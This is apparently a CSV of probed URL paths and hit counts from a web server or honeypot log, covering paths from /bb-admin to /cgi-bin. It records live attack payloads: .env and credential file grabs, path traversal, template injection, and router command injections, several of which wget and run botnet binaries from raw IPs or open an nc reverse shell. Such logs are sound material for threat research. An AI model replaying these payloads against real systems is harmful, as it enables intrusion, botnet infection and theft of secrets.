path,count
/bb-admin/,1
/bb-admin/admin.asp,1
/bb-admin/admin.aspx,1
/bb-admin/admin.cfm,1
/bb-admin/admin.html,1
/bb-admin/admin.jsp,1
/bb-admin/admin.php,1
/bb-admin/index.asp,1
/bb-admin/index.aspx,1
/bb-admin/index.cfm,1
/bb-admin/index.html,1
/bb-admin/index.jsp,1
/bb-admin/index.php,1
/bb-admin/login.asp,1
/bb-admin/login.aspx,1
/bb-admin/login.cfm,1
/bb-admin/login.html,1
/bb-admin/login.jsp,1
/bb-admin/login.php,1
/bbb,2
/bcm.sh,2
/bdb.sql,1
/bdi.talenta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/bdp,1
/beacons/,2
/beans/,1
/beatricce/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/beats/filebeat.yml,4
/beats/metricbeat.yml,4
/beef/,1
/beef/images/beef.gif,1
/beep3.php,2
/begrand/downtown_reforma/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/begrand/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/beifen.7z,1
/beifen.bak,1
/beifen.db,1
/beifen.gz,1
/beifen.rar,1
/beifen.tar.gz,1
/beifen.zip,1
/best.arm,27
/best.arm4,27
/best.arm5,27
/best.arm7,27
/best.mips,27
/best.mpsl,27
/best.ppc,27
/best.x86,27
/beta/,4
/beta/.env,726
/beta/.env.local,3
/beta/.env.production,3
/beta/.env.staging,3
/beta/.git/config,7
/beta/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php,1
/beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,9
/betanew/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/bg-button.png,1
/bg-middle.png,1
/bg-nav.png,1
/bg-upper.png,1
/bgoldd/.env,12
/bigb0ats.arm6,1
/bigcommerce/ssr.config.js,4
/bigmanlikejas.mips,1
/billing/invoice_config.json,4
/billplz/env.json,4
/bin.7z,4
/bin.armv4l,27
/bin.armv5l,26
/bin.armv6l,26
/bin.armv7l,26
/bin.gz,4
/bin.i586,26
/bin.i686,26
/bin.m68k,26
/bin.mips,26
/bin.mipsel,26
/bin.rar,4
/bin.sh,38
/bin.sh4,26
/bin.tar,4
/bin.tar.gz,4
/bin.x86_64,26
/bin.zip,194
/bin/,5
/bin/.env,6
/bin/.git/config,4
/bin/App.exe.config,2
/bin/bin.7z,4
/bin/bin.gz,4
/bin/bin.rar,4
/bin/bin.tar,4
/bin/bin.tar.gz,4
/bin/bin.zip,4
/bin/config.all.php,6
/bin/config.all.php?x,3
/bin/configurations/parsers/Checkpoint/CHECKPOINT.php,1
/bin/configure.sh,3
/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20,1
/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20,6
/bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+,1
/bin/init.sh,3
/bin/phpinfo.php,3
/bin/rails,2
/bin/rake,2
/bin/run.sh,3
/bin/view/Main/Search?r=1&text=propertyvalue%3A%3F*%20AND%20reference%3A*.password&f_locale=en&f_locale,1
/binNet.x86,1
/binance-credentials.json,4
/binance-keys.json,4
/binance-pay.json,4
/binance.env,4
/binancepay.config.js,4
/binancepay.yaml,4
/binaries/arc,11
/binaries/arm4,18
/binaries/arm5,11
/binaries/arm6,14
/binaries/arm7,10
/binaries/mips,15
/binaries/mpsl,9
/binnybins.spc,1
/bins.sh,30
/bins/686i,18
/bins/Hgf.arc,18
/bins/Hgf.arm5,14
/bins/Hgf.arm6,14
/bins/Hgf.arm7,17
/bins/Hgf.i686,16
/bins/Hgf.m68k,18
/bins/Hgf.mips,11
/bins/Hgf.mpsl,15
/bins/Hgf.ppc,11
/bins/Hgf.sh4,11
/bins/Hgf.spc,18
/bins/Hgf.x86,11
/bins/Hgf.x86_64,10
/bins/Mercury.arm6,1
/bins/Oblivion121.m68k,1
/bins/arc,9
/bins/arm,9
/bins/arm5,11
/bins/arm6,10
/bins/arm7,10
/bins/byte.arm,16
/bins/byte.arm5,21
/bins/byte.arm6,7
/bins/byte.arm7,14
/bins/byte.m68k,9
/bins/byte.mips,20
/bins/byte.mpsl,13
/bins/byte.ppc,15
/bins/byte.sh4,18
/bins/byte.spc,14
/bins/byte.x86,12
/bins/chary.mpsl,1
/bins/debug.dbg,19
/bins/dlr.arm,23
/bins/dlr.arm5,16
/bins/dlr.arm6,22
/bins/dlr.arm7,22
/bins/dlr.m68k,24
/bins/dlr.mips,21
/bins/dlr.mpsl,18
/bins/dlr.ppc,15
/bins/dlr.sh4,16
/bins/dlr.spc,21
/bins/dlr.x86,21
/bins/hold.arm,13
/bins/hold.arm5,12
/bins/hold.arm6,16
/bins/hold.arm7,9
/bins/hold.m68k,8
/bins/hold.mips,13
/bins/hold.mpsl,11
/bins/hold.ppc,18
/bins/hold.sh4,16
/bins/hold.spc,14
/bins/hold.x86,16
/bins/hold.x86_64,11
/bins/hydra.arm,18
/bins/hydra.arm5,17
/bins/hydra.arm6,16
/bins/hydra.arm7,12
/bins/hydra.m68k,11
/bins/hydra.mips,14
/bins/hydra.mpsl,19
/bins/hydra.ppc,15
/bins/hydra.sh4,11
/bins/hydra.spc,16
/bins/hydra.x86,14
/bins/hydra.x86_64,17
/bins/i686,15
/bins/jklarm,9
/bins/jklarm5,12
/bins/jklarm6,9
/bins/jklarm7,11
/bins/jklm68k,15
/bins/jklmips,15
/bins/jklmpsl,15
/bins/jklppc,14
/bins/jklsh4,14
/bins/jklspc,13
/bins/jklx86,15
/bins/k.i586,1
/bins/k86m,19
/bins/lespim,21
/bins/m68k,11
/bins/main_arm,18
/bins/main_arm5,17
/bins/main_arm6,16
/bins/main_arm7,15
/bins/main_m68k,16
/bins/main_mips,16
/bins/main_mpsl,14
/bins/main_ppc,15
/bins/main_sh4,15
/bins/main_x86,16
/bins/main_x86_64,16
/bins/mips,11
/bins/mpsl,12
/bins/nabarm,14
/bins/nabarm5,10
/bins/nabarm6,19
/bins/nabarm7,10
/bins/nabm68k,8
/bins/nabmips,9
/bins/nabmpsl,11
/bins/nabppc,10
/bins/nabsh4,11
/bins/nabspc,12
/bins/nabx86,13
/bins/nklarm,13
/bins/nklarm5,14
/bins/nklarm6,12
/bins/nklarm7,10
/bins/nklm68k,10
/bins/nklmips,11
/bins/nklmpsl,13
/bins/nklppc,11
/bins/nklsh4,10
/bins/nklspc,10
/bins/nklx86,14
/bins/pon,1
/bins/powerpc,11
/bins/ppc,9
/bins/res.x86,14
/bins/sh4,10
/bins/sora.arm,12
/bins/sora.arm5,13
/bins/sora.arm6,12
/bins/sora.arm7,12
/bins/sora.m68k,17
/bins/sora.mips,14
/bins/sora.mpsl,14
/bins/sora.ppc,15
/bins/sora.sh4,11
/bins/sora.spc,12
/bins/sora.x86,17
/bins/sound.m68k,1
/bins/spc,10
/bins/spim,14
/bins/splarm,11
/bins/splarm5,11
/bins/splarm6,18
/bins/splarm7,10
/bins/splm68k,8
/bins/splmips,14
/bins/splmpsl,8
/bins/splppc,12
/bins/splsh4,11
/bins/splspc,16
/bins/splx86,9
/bins/star.ppc,18
/bins/sys64.m68k,1
/bins/vcimanagement.armv4l,7
/bins/vcimanagement.armv5l,10
/bins/vcimanagement.armv6l,11
/bins/vcimanagement.armv7l,12
/bins/vcimanagement.i586,9
/bins/vcimanagement.i686,11
/bins/vcimanagement.m68k,12
/bins/vcimanagement.mips,12
/bins/vcimanagement.mipsel,16
/bins/vcimanagement.powerpc,14
/bins/vcimanagement.sh4,15
/bins/vcimanagement.sparc,9
/bins/vcimanagement.x86,8
/bins/x86,10
/bins/x86_64,15
/bins/zerarm,16
/bins/zerarm5,14
/bins/zerarm6,11
/bins/zerarm7,15
/bins/zerm68k,12
/bins/zermips,13
/bins/zermpsl,11
/bins/zerppc,10
/bins/zersh4,9
/bins/zerspc,11
/bins/zerx86,10
/bitbucket-pipelines-keys,3
/bitbucket-pipelines.yml,6
/bitbucket/rest/applinks/1.0/manifest,1
/bitcoin/bitcoin.conf,4
/bitcoind/.env,3
/bitdefender/settings.json,4
/bitnami.css,29
/bitnami/credentials,3
/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror=alert(document.domain)%20src=1>,1
/bitrix/php_interface/dbconn.php,1563
/bko,1
/blackboard-learn-secrets,3
/blackbox-admin-keyring,3
/blankon/.env,9
/blast/nph-viewgif.cgi?../../../../etc/passwd,1
/blazeds/messagebroker/http,1
/blazeds/messagebroker/httpsecure,1
/blf.sh,1
/blink,28
/blitz.config.js,4
/blob/.env,12
/blockchain/env.json,4
/blockchain/nodes.json,4
/blog/,2
/blog/.env,57
/blog/.git/config,10
/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,492
/blog/wp-admin/setup-config.php?step=0,3
/blog/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/blog/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/blog/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/blog/wp-content/themes/.git/config,7
/blog/wp-includes/wlwmanifest.xml,34
/blog/wp-login.php,1
/blog/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,7
/blog1/.env,8
/blogs/.env,24
/blue/.env,14
/bluepay/settings.yaml,4
/bluesnap/config.js,4
/blw.sh,2
/blxntz.arm5,1
/blxntz.ssh4,1
/blxntz.x64,1
/bmwstory/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/bns/quinn.x86,1
/bo,2
/bo.arm5n,1
/boa,3
/boaform/admin/formLogin,363
/boaform/admin/formLogin?username=admin&psd=admin,80
/boaform/admin/formLogin?username=adminisp&psd=adminisp,73
/boaform/admin/formLogin?username=ec8&psd=ec8,81
/boaform/admin/formLogin?username=user&psd=user,74
/board/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27,1
/boards.txt,4
/boards/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27,1
/boatnet.arc,30
/boatnet.arm,30
/boatnet.arm5,29
/boatnet.arm6,30
/boatnet.arm7,29
/boatnet.i686,27
/boatnet.m68k,30
/boatnet.mips,30
/boatnet.mpsl,30
/boatnet.ppc,30
/boatnet.sh4,30
/boatnet.spc,30
/boatnet.x86,29
/boatnet.x86_64,26
/bojwsl,17
/bolt,4
/bolt/login,4
/bolt/overview,4
/bolubotnetarm,26
/bolubotnetarm5,26
/bolubotnetarm6,26
/bolubotnetarm7,26
/bolubotnetm68k,26
/bolubotnetmips,26
/bolubotnetmpsl,27
/bolubotnetppc,27
/bolubotnetsh4,27
/bolubotnetx86,26
/bolubotnetx86_64,27
/bomba.ppc,1
/bonita/login.jsp,4
/bonns,1
/bookchain-client/.env,3
/bookmark.nsf,1
/boot.arm4tl,1
/boot.ini,1
/boot/.env,6
/boot/config.txt,4
/bootstrap.yml,6
/bootstrap/.env,9
/bootstrap/cache/,4
/bootstrap/cache/config.php,1509
/bootstrap/cache/packages.php,4
/bootstrap/cache/routes.php,4
/bootstrap/cache/services.php,4
/bork,2
/bot.arm,42
/bot.arm5,45
/bot.arm6,43
/bot.arm7,44
/bot.m68k,51
/bot.mips,41
/bot.mpsl,47
/bot.ppc,42
/bot.sh4,44
/bot.spc,26
/bot.x86,48
/bot.x86_64,47
/bot/.env,16
/bot_armv4_el,1
/bot_i686_eb,1
/botirc.arm7,1
/botirc.mpsl,1
/botirc.x86,1
/botnet.arm5,26
/botnet.arm6,25
/botnet.arm7,26
/botnet.m68k,26
/botnet.mips,26
/botnet.mpsl,25
/botnet.sh4,25
/botnet.spc,26
/botnet.x86,26
/botnt.arm,27
/botnt.arm5,27
/botnt.arm7,27
/botnt.armv7v5,27
/botnt.mips,27
/botnt.mpsl,27
/bots/globals/e_detector/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/bots/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/botx.arm,28
/botx.arm5,27
/botx.arm6,28
/botx.arm7,28
/botx.m68k,28
/botx.mips,28
/botx.mpsl,28
/botx.ppc,28
/botx.sh4,28
/botx.spc,28
/botx.x86,28
/bowenpayments/bowenpay/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/bower_components/,4
/boxes/oracle-vagrant-boxes/ContainerRegistry/.env,2
/boxes/oracle-vagrant-boxes/Kubernetes/.env,2
/bpJncUEIUmAgsWjqraqMMn5GluYkLUoPuW,27
/bqa.sh,1
/braintree-credentials.json,4
/braintree-keys.json,4
/braintree.config.js,4
/braintree.env,4
/braintree.json,4
/braintree.yaml,4
/braintree/config.json,4
/braintree/merchant_config.xml,4
/breakitdown.arm6,1
/brick.sh,2
/browserId/wizard.jhtml,1
/browserId/wizardForm.jhtml,1
/brr,2
/bsc_lan.php,1
/bu/.env,6
/bucoffea/.env,9
/buddha/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/buddy-webhooks-secrets,3
/buf,2
/bugs/verify.php?confirm_hash&id=1,1
/bugtracker/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php,1
/bugtracker/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/build.exe,3
/build.gradle,6
/build.gradle.kts,4
/build.ninja,4
/build.php,696
/build.sh,7
/build/,7
/build/.env,122
/build/.git/config,53
/build/Dockerfile,2
/build/app/outputs/apk/release/,4
/build2.exe,3
/build9.exe,3
/build_2024-07-24_23-16.exe,3
/build_2024-07-25_20-56.exe,3
/build_2024-07-27_00-41.exe,3
/build_tool/.git/config,45
/building.html,1
/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini,1
/buildkite/pipeline.yml,4
/buildred.exe,3
/bulon.armv6,1
/bulon.dbg,1
/bulu.armv4,1
/busybox-ppc440,1
/busytime.nsf,1
/buu,1
/bx,30
/byroernne/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/byte.arm,26
/byte.arm5,26
/byte.arm6,26
/byte.arm7,25
/byte.m68k,25
/byte.mips,25
/byte.mpsl,26
/byte.ppc,26
/byte.sh4,26
/byte.spc,26
/byte.x86,26
/c,2
/c.arm,27
/c.arm5,27
/c.arm6,27
/c.arm7,27
/c.m68k,27
/c.mips,27
/c.mpsl,27
/c.ppc,27
/c.sh,31
/c.spc,27
/c.x86,27
/c/,18
/c/xpcom.common.js,1
/c0az1l4js3001lsk4xd9n.x86,1
/c0r0n4x.arm7,1
/c1,1
/c2,2
/c2/server/config.json,4
/c2b/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/c2c/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/c6,2
/c99.php,4
/cSCc,1
/ca/intermediate.crt,4
/caak72W97tDc3EghxgOox2pYD4rZXRr9YX,27
/cable.sh,2
/cache.php,693
/cache/,3
/cache/.env,12
/cache/.git/config,4
/cache/backup/,2
/cache/cache.db,3
/cache/config.json,1
/cache/config.php,4
/cache/headers.json,4
/cache/phpinfo.php,3
/cache_old/,4
/cacti/,1
/cacti/cmd_realtime.php?1+1&&curl%20ct553c916vc7v40lu5f0i4ftab6rwhpqr.oast.online+1+1+1,1
/cacti/include/config.php,3
/cafe50/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/cag/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/cake/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,2
/cakephp/phpinfo.php,3
/cakephp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,2
/cal/cal_cat.php,1
/cal_cat.php,1
/cal_search.php,1
/calamity.dbg,1
/calendar/cal_cat.php,1
/calendar/cal_search.php,1
/callme/callForm.jhtml,1
/cam.sh,2
/campuslag/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/canarytokens/token.json,4
/canvas-lms-secure-config,3
/carbon/admin/login.jsp,1
/carbon/generic/save_artifact_ajaxprocessor.jsp,1
/card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20kasjkAwFGa.txt%60,1
/cardea/backend/.env,9
/careers/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/cas/,1
/casa/nodes/thumbprints,2
/casadosvidros/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1
/cassandra/.env.cql,3
/catalog-portal/ui/oauth/verify?error&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d,1
"/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b""freemarker%2etemplate%2eutility%2eExecute""%3fnew%28%29%28""id""%29%7d",1
/catalog.nsf,1
/catalog.php?filename=../../../../../../../../../etc/passwd,1
/categories/SOMEOTHERDIR/allcategories.aspx,1
/categories/allcategories.aspx,1
/categories/viewcategory.aspx,1
/category/uncategorized,1
/category/uncategorized/,10
/category_view.php,1
/cbr.arcle-hs38,1
/cc,2
/ccc,2
/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd,1
/cdb/cmd/list,1
/cdi.sh,1
/cdk.out/AwsDeploymentStack.template.json,3
/cdn-cgi/trace,7
/cdn.md,2
/cdn/config.yml,4
/cdw-backend/.env,9
/cert.pem,4
/certa.nsf,1
/certbot/conf.ini,4
/certlog.nsf,1
/certs/apache.crt,4
/certs/cert.pem,4
/certs/fullchain.pem,4
/certs/privkey.pem,4
/certs/ssl_private.key,3
/certsrv.nsf,1
/certsrv/certrqad.asp,1
/cf-cache-status,4
/cf_scripts/scripts/ajax/ckeditor/ckeditor.js,23
/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/2pXsbNSnLXmzJ0rbgQv1ZfzhBPt.jsp,1
/cfdocs/,4
/cfg/,1
/cfg/.env,6
/cfide/install.cfm,1
/cfn-t1.yaml,2
/cgi-bin,2
/cgi-bin-hax/ExportSettings.sh,1
/cgi-bin/,4
/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,555
/cgi-bin/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/bin/sh,1
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts,12
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh,1
/cgi-bin/.%2e/%2e/%2e/%2e/%2e/%2e/%2e/%2e/%2e/%2e/bin/sh,2
/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,599
/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd,1
/cgi-bin/.env,49
/cgi-bin/.git/config,4
/cgi-bin/;cat$IFS/etc/passwd,1
/cgi-bin/ExportAllSettings.sh,1
/cgi-bin/ExportLogs.sh,1
/cgi-bin/ExportSettings.sh,2
/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd,1
/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27,4
/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig,4
/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ping${IFS}-c${IFS}1${IFS}ct553c916vc7v40lu5f0y39hfetfp1i69.oast.online,1
/cgi-bin/authLogin.cgi,180
/cgi-bin/avalanch.asp,2
/cgi-bin/awstats.pl,1
/cgi-bin/cgiServer?worker=IndexNew,1
/cgi-bin/check_auth.json,3
/cgi-bin/ck/mimencode,1
/cgi-bin/config.exp,1
/cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=cat%20/etc/passwd,1
/cgi-bin/export-cgi?category=config&arg0=startup-config.conf,1
/cgi-bin/exportCfgwithpasswd,1
/cgi-bin/fax_change_faxtrace_settings,2
/cgi-bin/ffileman.cgi,1
/cgi-bin/file_transfer.cgi,1
/cgi-bin/firewall.cgi,1
/cgi-bin/getwifiattr.cgi,3
/cgi-bin/hotspotlogin.cgi,45
/cgi-bin/image/shikaku2.png,1
/cgi-bin/index.cgi,113
/cgi-bin/index.html,99
/cgi-bin/info.cgi,5
/cgi-bin/iptest.cgi?&-url=%20-c%201%200.0.0.0,3
/cgi-bin/jarrewrite.sh,1
/cgi-bin/kerbynet?Action=StartSessionSubmit&User='%0acat%20/etc/passwd%0a'&PW,1
/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aexpr%20825057818%20-%20962614343%0A%27,1
/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22,1
/cgi-bin/koha/svc/virtualshelves/search?template_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,1
/cgi-bin/libagent.cgi?type=J,2
/cgi-bin/live_api.cgi?page=Fp5&id=9&ip=;id;,1
/cgi-bin/login.cgi,32
/cgi-bin/login?LD_DEBUG=files,1
/cgi-bin/login_mgr.cgi?C1=ON&cmd=login&f_type=1&f_username=admin&port=80%7Cpwd%26id&pre_pwd=1&pwd=%20&ssl=1&ssl_port=1&username,1
/cgi-bin/logoff.cgi,1
/cgi-bin/luci,1
/cgi-bin/luci/,8
/cgi-bin/luci/;stok=/locale,1066
/cgi-bin/luci/;stok=/locale?form=country&operation=read,29
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60%2Fbin%2Fbusybox+%2Fbin%2Fsh+-c+%2Fbin%2Fkill+1%3B%60),4
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60%2Fbin%2Fbusybox+kill+1%3B%60),1
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60busybox+reboot%3B%60),7
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+tplink%3B+wget+http%3A%2F%2F45.202.35.36%2Ftplink%3B+chmod+777+tplink%3B+.%2Ftplink%3B%60),4
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+tplink%3B+wget+http%3A%2F%2F45.202.35.88%2Ftplink%3B+chmod+777+tplink%3B+.%2Ftplink+tplink%3B+rm+-rf+tplink%60),15
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+tplink%3B+wget+http%3A%2F%2F89.32.41.95%2Ftplink%3B+chmod+777+tplink%3B+.%2Ftplink%3B%60),1
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+umount+%22%2Fproc%2F%24pid%22+%26%26+kill+-9+%22%24%7Bpid%23%23%2A%2F%7D%22%3B+done%3B+wget+-O-+http%3A%2F%2F154.216.17.169%2Ft%7Csh%3B%60),2
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60kill+1%3B%60),2
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60kill+1%60),2
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(nc+31.220.1.144+4444+-e+%2Fbin%2Fsh%60),1
/cgi-bin/luci/admin,1
/cgi-bin/luci/api/auth,4
/cgi-bin/luci;stok=/locale,1
/cgi-bin/main.pl,19
/cgi-bin/mainfunction.cgi,2
/cgi-bin/masterCGI,1
/cgi-bin/masterCGI?ping=nomip&user=;id;,1
/cgi-bin/masterCGI?ping=nomip&user=;ping+-c+4+45.221.98.118;,1
/cgi-bin/mj_wwwusr,1
/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd,1
/cgi-bin/mt/mt-xmlrpc.cgi,1
/cgi-bin/nas_sharing.cgi?user=mydlinkBRionyg&passwd=YWJjMTIzNDVjYmE&cmd=15&system=aWQ=,1
/cgi-bin/p2p.cgi?cmd=p2p.cgi&-action=get,1
/cgi-bin/param.cgi?post_network_other_conf,4
/cgi-bin/php,1
/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('powershell.exe%20-Command%20%22%26%20%7Biwr%20-Uri%20http%3A%2F%2F23.27.51.244%2Fscript.ps1%20-OutFile%20script.ps1%3B%20.%2Fscript.ps1%7D%22');?>,2
